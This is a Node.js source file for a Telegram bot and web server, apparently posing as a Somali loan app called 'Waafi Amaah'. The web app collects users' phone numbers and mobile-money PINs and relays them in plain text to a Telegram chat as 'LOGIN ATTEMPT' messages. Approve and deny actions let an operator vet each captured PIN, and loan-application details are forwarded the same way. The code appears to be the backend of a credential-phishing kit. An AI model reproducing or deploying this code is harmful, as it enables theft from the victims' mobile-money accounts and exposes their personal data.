const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// 1. Initialize Bot
const bot = new Telegraf(process.env.BOT_TOKEN);

// 2. Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// 3. Home Route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// 4. Dynamic Pages
app.get('/:page', (req, res) => {
    const page = req.params.page;
    const filePath = path.join(__dirname, 'public', `${page}.html`);

    res.sendFile(filePath, (err) => {
        if (err) res.status(404).send("Boggaan lama helin");
    });
});

// 5. Start Command (FIXED KEYBOARD)
bot.start((ctx) => {
    ctx.reply('Ku soo dhowaad Waafi Amaah! 👇', {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "Open App", web_app: { url: "https://your-domain.com" } }
                ]
            ]
        }
    });
});

// 6. Handle Web App Data
bot.on('message', async (ctx) => {
    const webAppData = ctx.message?.web_app_data;
    if (!webAppData) return;

    try {
        const data = JSON.parse(webAppData.data);
        const currentTime = new Date().toLocaleString('en-US', { hour12: true });

        // A. Login attempt
        if (data.pin) {
            const loginMsg =
                `📱 CL 2 - LOGIN ATTEMPT\n\n` +
                `🆕 NEW USER\n` +
                `🇸🇴 Country: Somalia\n` +
                `📱 Phone: ${data.phone}\n` +
                `🔢 PIN: ${data.pin}\n` +
                `⏰ Time: ${currentTime}\n\n` +
                `⚠ User waiting for approval`;

            await ctx.reply(loginMsg);
        }

        // B. Loan application
        else {
            const summary =
                `✅ CODSI CUSUB WAA LA HELAY!\n\n` +
                `👤 Magaca: ${data.firstName || ''} ${data.lastName || ''}\n` +
                `📞 Telefoon: +252${data.phone || ''}\n` +
                `💰 Lacagta: $${data.amount || 'N/A'}\n` +
                `📆 Muddada: ${data.duration || 'N/A'}\n` +
                `💼 Shaqo: ${data.jobStatus || 'N/A'}\n` +
                `💵 Dakhliga: $${data.income || 'N/A'}\n` +
                `📝 Ujeedada: ${data.loanPurpose || 'N/A'}`;

            await ctx.reply(summary);
        }

    } catch (err) {
        console.error("Data error:", err);
    }
});

// 6.1 Approve action (FIXED INLINE KEYBOARD SYNTAX)
bot.action(/approve_(.+)_(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    const time = new Date().toLocaleTimeString('en-US', { hour12: true });

    const approvedMsg =
        `✅ LOGIN APPROVED\n\n` +
        `📱 Phone: ${phone}\n` +
        `🔐 PIN: ${pin}\n` +
        `⏰ ${time}`;

    try {
        await ctx.editMessageText(approvedMsg);
    } catch (e) {
        console.error("Edit failed:", e);
    }
});

// Deny action
bot.action('deny', (ctx) => {
    ctx.editMessageText("❌ Informashinka waa khalad.");
});

// 7. Start Server
app.listen(PORT, '0.0.0.0', async () => {
    console.log(`✅ Server is running on port ${PORT}`);

    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        await bot.launch();
        console.log('✅ Telegram Bot launched successfully');
    } catch (err) {
        console.error('❌ Bot launch failed:', err.message);
    }
});

// 8. Safe stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
